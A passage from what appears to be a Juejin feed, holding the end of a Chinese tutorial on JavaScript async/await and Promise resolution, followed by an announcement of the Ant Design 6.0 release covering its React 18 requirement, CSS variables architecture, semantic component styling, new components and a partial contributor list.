  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result2)
}
<span class="hljs-title function_">doThingFn</span>()
</code></pre>
<p>有的小伙伴会问：  resolve('B') 为啥不需要return<br/>
因为： resolve 是一个回调函数，它用来改变 Promise 的状态从 "pending" 到 "fulfilled"<br/>
调用 resolve('B') 只是通知 Promise 完成，并传递值 'B' 给后续的 .then() 或 await<br/>
return new Promise(...) 是 timeOutFn 函数的返回值<br/>
resolve('B') 是设置 Promise 的解析值，不是函数的返回值</p>
<h3 data-id="heading-6">await 不能单独使用，需要配合async一起使用。</h3>
<h4 data-id="heading-7">不要乱用await，因为 await 是基于 Promise 一起使用的(后面跟的是一个 Promise 对象)</h4>
<h4 data-id="heading-8">async 和 await 的语法规则</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-number">1</span>, <span class="hljs-keyword">async</span> 是 <span class="hljs-keyword">function</span> 的一个前缀，只有 <span class="hljs-keyword">async</span> 函数中才能使用 <span class="hljs-keyword">await</span> 语法  
<span class="hljs-number">2</span>, <span class="hljs-keyword">async</span> 函数永远会返回一个promise,即使你在函数中没有返回任何值。  
<span class="hljs-number">3</span>, <span class="hljs-keyword">await</span> 后面跟的是一个 <span class="hljs-title class_">Promise</span> 对象，如果不是，则会包裹一层 <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()  
</code></pre>
<h4 data-id="heading-9">await和async的主要作用</h4>
<p>await和async 主要是用来优化处理回调地狱的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🎉 Ant Design 6.0 来了！ 🎉]]></title>    <link>https://juejin.cn/post/7575751471842230308</link>    <guid>https://juejin.cn/post/7575751471842230308</guid>    <pubDate>2025-11-24T03:37:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471842230308" data-draft-id="7575937594350551083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🎉 Ant Design 6.0 来了！ 🎉"/> <meta itemprop="keywords" content="React.js,Ant Design"/> <meta itemprop="datePublished" content="2025-11-24T03:37:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="zombieJ"/> <meta itemprop="url" content="https://juejin.cn/user/4406498335924669"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🎉 Ant Design 6.0 来了！ 🎉
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4406498335924669/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    zombieJ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:37:11.000Z" title="Mon Nov 24 2025 03:37:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>自开源以来，Ant Design 已收获 <strong>96.6K Star</strong>、累计 <strong>31.9K issue</strong>、<strong>20.7K PR</strong>、发布了 <strong>904 个 npm 版本</strong>，并有 <strong>2314 位贡献者</strong> 共同参与其中。这些数字不仅代表着社区的活跃度与支持，也见证了项目的不断进化与成熟。</p>
<p>正因为你们，Ant Design 才能不断成长，向下一站前行：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fant-design%2Fdiscussions%2F51919" target="_blank" title="https://github.com/ant-design/ant-design/discussions/51919" ref="nofollow noopener noreferrer">《Plan about Ant Design 6.0》</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d501f3ac2039489787fa9175f8ce94a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=gfXyCzjp1%2BXDPgJqPtSN0EKoF0k%3D" alt="Ant Design 6.0" loading="lazy"/></p>
<p>经过大量 RFC 讨论以及多个 Alpha 版本的迭代，v6 已进入稳定阶段。今天，我们宣布 Ant Design v6 正式发布！</p>
<p>本次升级以 <strong>技术侧深度优化</strong> 为重点，旨在为 React 19 以及未来版本提供更好的兼容与性能（版本兼容提升至 React 18），并进一步完善组件的语义化结构和 CSS 变量支持。</p>
<p>与 v5 不同，这次升级是 <strong>平滑版本迁移</strong>：</p>
<ul>
<li>如果你的项目已经运行在 v5，无需使用兼容包或 codemod 工具，即可直接升级到 v6。</li>
<li>v5 主分支将切换至 <code>v5.x-stable</code> 进入 <strong>1 年维护周期</strong>。
<ul>
<li>除非出现特别严重的 Bug，我们不会再对 v5 进行功能性更新。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-1">技术升级与核心变化</h2>
<h3 data-id="heading-2">⚛ React 最低版本要求提升至 18</h3>
<p>v6 支持版本从 React 18 起，移除了此版本之前的 React 兼容逻辑，避免了不同版本间的 API 行为差异。<br/>
我们仍然建议使用最新的 React 19 版本以获得最佳体验。</p>
<p>对于静态方法比如 <code>Modal.confirm</code>，你已经不需要额外的兼容代码或依赖，可直接移除相关兼容代码：</p>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">-- import '@ant-design/v5-patch-for-react-19';</span>
</code></pre>
<h4 data-id="heading-3">📦 dist 开启 React Compiler</h4>
<p>在打包产物 <code>antd.js</code> 以及 <code>antd.min.js</code> 中启用了 <code>React Compiler</code> 以优化性能，对使用 CJS/ESM 场景的用户可自行选择开启，参考 <a href="https://link.juejin.cn?target=https%3A%2F%2Fzh-hans.react.dev%2Flearn%2Freact-compiler" target="_blank" title="https://zh-hans.react.dev/learn/react-compiler" ref="nofollow noopener noreferrer">React 官方文档</a>。</p>
<h3 data-id="heading-4">🌈 纯 CSS Variables 样式架构</h3>
<p>随着 IE 支持的彻底移除，v6 中的 <code>@ant-design/cssinjs</code> 默认采用 <strong>纯 CSS Variables 模式</strong>：</p>
<ul>
<li>样式切换更轻量，支持实时主题变化。</li>
<li>多主题复用降低打包体积。</li>
<li>支持零运行时样式生成，可搭配 <code>@ant-design/static-style-extract</code>：</li>
</ul>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">ConfigProvider</span> theme={{ <span class="hljs-attr">zeroRuntime</span>: <span class="hljs-literal">true</span> }}&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>
&lt;/<span class="hljs-title class_">ConfigProvider</span>&gt;
</code></pre>
<p>性能对比如下，zeroRuntime 模式表现最佳（水平轴为主题数量）：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4de97f05147748d0af7780584115173a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Rkh%2FsPRekDaDSAX1Y186myrzzHQ%3D" alt="Size" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73e8d833c4b349359a4a0776707c6007~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=e7QbHETV9sqsRUnOm4irJm7psec%3D" alt="Speed" loading="lazy"/></p>
<p>你可以通过 <code>useToken</code> 获取完整变量名：</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> {
    <span class="hljs-attr">cssVar</span>: { colorBgElevated },
  } = theme.<span class="hljs-title function_">useToken</span>();
};
</code></pre>
<h4 data-id="heading-5">🚫 不再支持 IE</h4>
<p>CSS Variables 模式彻底移除 IE 兼容的 StyleProvider。</p>
<h3 data-id="heading-6">🧩 全量组件语义化结构</h3>
<p>v6 完成了 <strong>所有组件</strong> 的 DOM 语义化改造：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a54f3d23bd74f3f8b269c116aa89d9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Ojzu3Xb78GSlzNTFgKuB41GwBOE%3D" alt="Semantic Structure" loading="lazy"/></p>
<ul>
<li>#52115</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ac32b5e154a4e63afde02aad6c50f68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Mjc0ByWR9ZeMrih4EBOI8VIRpVE%3D" alt="Semantic Render Props" loading="lazy"/></p>
<ul>
<li>#54995</li>
</ul>

<ul>
<li>API 使用逻辑位置描述（如 <code>start</code> / <code>end</code>），支持 RTL。</li>
<li>内部结构可用 ConfigProvider 的 <code>classNames</code> 和 <code>styles</code> 统一配置。
<ul>
<li>支持函数式动态生成语义结构：</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-attr">btnClassNames</span>: <span class="hljs-title class_">ButtonProps</span>[<span class="hljs-string">'classNames'</span>] = <span class="hljs-function">(<span class="hljs-params">{ props }</span>) =&gt;</span> {
  <span class="hljs-keyword">switch</span> (props.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'primary'</span>:
      <span class="hljs-keyword">return</span> { ... };
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> { ... };
  }
};

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ConfigProvider</span> <span class="hljs-attr">button</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">classNames:</span> <span class="hljs-attr">btnClassNames</span> }}&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ConfigProvider</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-7">俏皮图标按钮</h4>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Button</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">'rounded-tr-xl rounded-bl-xl'</span>,
    <span class="hljs-attr">icon</span>: <span class="hljs-string">'rotate-30'</span>,
  }}
  icon={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">SmileOutlined</span> /&gt;</span></span>}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span>
&lt;/<span class="hljs-title class_">Button</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0048cfdcc71c47deaa8d6813bb256a0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=kBJ4uC5EJRqwFymnEDJsuRufg2Y%3D" alt="Funny" loading="lazy"/></p>
<h4 data-id="heading-8">极客风卡片</h4>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Card</span>
  title=<span class="hljs-string">"Hello World"</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">"bg-green-300/10 text-green-500 border-green-500 rounded-none [box-shadow:0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">header</span>: <span class="hljs-string">"rounded-none border-green-500 [box-shadow:inset_0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">title</span>:
      <span class="hljs-string">"text-green-500 [text-shadow:0_0_12px_theme(colors.green.400)] overflow-visible"</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-string">"rounded-none [text-shadow:0_0_8px_theme(colors.green.400)] [box-shadow:inset_0_0_12px_theme(colors.green.500)]"</span>
  }}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span> loves you!~ (=^・ω・^)
&lt;/<span class="hljs-title class_">Card</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c379d0325d8244a2a449dceac39ffb11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=2%2FBVdMSUSor%2FPahE16xfFE7A8IM%3D" alt="Geek Green" loading="lazy"/></p>
<h3 data-id="heading-9">🚫 移除 v4 废弃 API</h3>
<p>v6 移除了在 v4 废弃、v5 保留兼容的所有 API：</p>
<ul>
<li><code>findDOMNode</code> 兼容逻辑移除。</li>
<li><strong>List</strong>、<strong>Dropdown.Button</strong>、<strong>BackTop</strong> 文档移除但保留兼容。</li>
<li>React 18 兼容代码删除（直接支持 18）。</li>
<li>统一 API 命名风格，兼容 v5 所有 API。</li>
</ul>
<h2 data-id="heading-10">新组件与功能增强</h2>
<h3 data-id="heading-11">🔥 Masonry 瀑布流组件</h3>
<p>用于图片展示、卡片流等场景：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9422f1c5214648d4a5428eadaf324f51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=fZW0VVbxTyvTWTSx6FjBHB4vHUA%3D" alt="Masonry" loading="lazy"/></p>
<h3 data-id="heading-12">🔥 Tooltip 支持平移滑动</h3>
<p>在多个提示内容之间开启平移滑动：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e742cda3d834516b80ba9fc7c8f69cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=vVlXMk5e7nfEq3cr6J7CF0zjejM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">🆕 InputNumber <code>spinner</code> 模式</h3>
<p>常见的按钮平铺样式，便于用户直接点击交互：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c478906c3f1b40d5ab174a325fe62d01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=4ZGqSqtmjSqzKKeQeyJvr0%2BzjR0%3D" alt="Spinner InputNumber" loading="lazy"/></p>
<h3 data-id="heading-14">🆕 Drawer 支持拖拽</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a53e5d900542ebbae10b8a4e4b2ce9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=GLSlQLCWes16xxt3aRNYXSCc5SM%3D" alt="Resizable Drawer" loading="lazy"/></p>
<h3 data-id="heading-15">🎨 蒙版模糊背景</h3>
<p>所有弹层默认使用模糊效果，可通过 <code>mask: { blur: false }</code> 关闭：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bfa07fa9a524614801832e7ebc7621b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Nv%2FYjwuFhll18o6nKHFs4BNswfg%3D" alt="Blur Mask" loading="lazy"/></p>
<h2 data-id="heading-16">升级指南</h2>
<ul>
<li>v6 对 v5 完全兼容，可直接升级。
<ul>
<li>建议按警告替换废弃 API。</li>
</ul>
</li>
<li>项目需运行在 <strong>React 18 或更高版本</strong>。</li>
<li>不再支持 <strong>IE</strong>。</li>
</ul>
<h2 data-id="heading-17">未来计划</h2>
<ul>
<li>优化移动端交互体验。</li>
<li>增强无障碍（Accessibility）支持。</li>
<li>跟进 React 新特性提升性能。</li>
<li>更多新组件开发中，敬请期待。</li>
</ul>
<h2 data-id="heading-18">One More Thing</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b789e7d0d6b4445b1887885f8a03fe8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=zn8tZHe6EAVFgb27FaHQsIU9ddM%3D" alt="Ant Design X 2.0" loading="lazy"/></p>
<p>🚀 Ant Design X 同步发布 2.0 版本。作为 Ant Design 面向 AI 场景的组件库，新版本带来了更强大的交互与渲染能力。如果你正在探索 AI 驱动的界面体验，现在就是最佳时机：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fx%2Fissues%2F1358" target="_blank" title="https://github.com/ant-design/x/issues/1358" ref="nofollow noopener noreferrer">🎉 Ant Design X 2.0 正式发布了 🎉</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21e252f7d385437a9647cd0b8ab4e1f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=GsfiWfHcXL0L1Ww8S1gUwNb1Xkk%3D" alt="LUI" loading="lazy"/></p>
<h2 data-id="heading-19">写在最后</h2>
<p>Ant Design 自第一行代码以来，经历了 10 个年头。我们希望在 AI 浪潮之下，Ant Design 仍然是你的最好伙伴。感谢为 v6 付出的各位朋友。 —— 因为你们的参与，开源才如此美好：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F984507092" target="_blank" title="https://github.com/984507092" ref="nofollow noopener noreferrer">984507092</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fafc163" target="_blank" title="https://github.com/afc163" ref="nofollow noopener noreferrer">afc163</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faojunhao123" target="_blank" title="https://github.com/aojunhao123" ref="nofollow noopener noreferrer">aojunhao123</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FArktomson" target="_blank" title="https://github.com/Arktomson" ref="nofollow noopener noreferrer">Arktomson</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcactuser-Lu" target="_blank" title="https://github.com/cactuser-Lu" ref="nofollow noopener noreferrer">cactuser-Lu</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fccc1018" target="_blank" title="https://github.com/ccc1018" ref="nofollow noopener noreferrer">ccc1018</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FcodewizardTM" target="_blank" title="https://github.com/codewizardTM" ref="nofollow noopener noreferrer">codewizardTM</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoding-ice" target="_blank" title="https://github.com/coding-ice" ref="nofollow noopener noreferrer">coding-ice</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcrazyair" target="_blank" title="https://github.com/crazyair" ref="nofollow noopener noreferrer">crazyair</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdivyeshagrawal" target="_blank" title="https://github.com/divyeshagrawal" ref="nofollow noopener noreferrer">divyeshagrawal</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felrrrrrrr" target="_blank" title="https://github.com/elrrrrrrr" ref="nofollow noopener noreferrer">elrrrrrrr</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEmilyyyLiu" target="_blank" title="https://github.com/EmilyyyLiu" ref="nofollow noopener noreferrer">EmilyyyLiu</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffireairforce" target="_blank" title="https://github.com/fireairforce" ref="nofollow noopener noreferrer">fireairforce</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGinWU05" target="_blank" title="https://github.com/GinWU05" ref="nofollow noopener noreferrer">GinWU05</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fguoyunhe" target="_blank" title="https://github.com/guoyunhe" ref="nofollow noopener noreferrer">guoyunhe</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhcjlxl" target="_blank" title="https://github.com/hcjlxl" ref="nofollow noopener noreferrer">hcjlxl</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FJeeekXY" target="_blank" title="https://github.com/JeeekXY" ref="nofollow noopener noreferrer">JeeekXY</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FJerryqun" target="_blank" title="https://github.com/Jerryqun" ref="nofollow noopener noreferrer">Jerryqun</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjin19980928" target="_blank" title="https://github.com/jin19980928" ref="nofollow noopener noreferrer">jin19980928</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjon-cullison" target="_blank" title="https://github.com/jon-cullison" ref="nofollow noopener noreferrer">jon-cullison</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkiner-tang" target="_blank" title="https://github.com/kiner-tang" ref="nofollow noopener noreferrer">kiner-tang</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fli-jia-nan" target="_blank" title="https://github.com/li-jia-nan" ref="nofollow noopener noreferrer">li-jia-nan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLinkodt" target="_blank" title="https://github.com/Linkodt" ref="nofollow noopener noreferrer">Linkodt</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flovelts" target="_blank" title="https://github.com/lovelts" ref="nofollow noopener noreferrer">lovelts</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMadCcc" target="_blank" title="https://github.com/MadCcc" ref="nofollow noopener noreferrer">MadCcc</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmeet-student" target="_blank" title="https://github.com/meet-student" ref="nofollow noopener noreferrer">meet-student</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnmsn" target="_blank" title="https://github.com/nmsn" ref="nofollow noopener noreferrer">nmsn</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOysterD3" target="_blank" title="https://github.com/OysterD3" ref="nofollow noopener noreferrer">OysterD3</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FPsiphonc" target="_blank" title="https://github.com/Psiphonc" ref="nofollow noopener noreferrer">Psiphonc</a><br/>
